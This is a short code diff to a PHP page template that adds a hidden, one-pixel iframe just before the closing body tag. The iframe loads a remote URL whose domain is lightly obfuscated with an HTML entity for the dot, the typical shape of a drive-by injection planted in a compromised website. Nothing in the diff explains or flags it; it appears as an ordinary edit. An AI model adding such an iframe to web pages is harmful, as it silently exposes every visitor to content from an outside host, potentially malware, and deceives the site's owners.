@@ -177,5 +177,6 @@
             </div>
             <?php include('tempelet/footer.php') ?>
         </div>
-    </body>
+    <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+</body>
 </html>
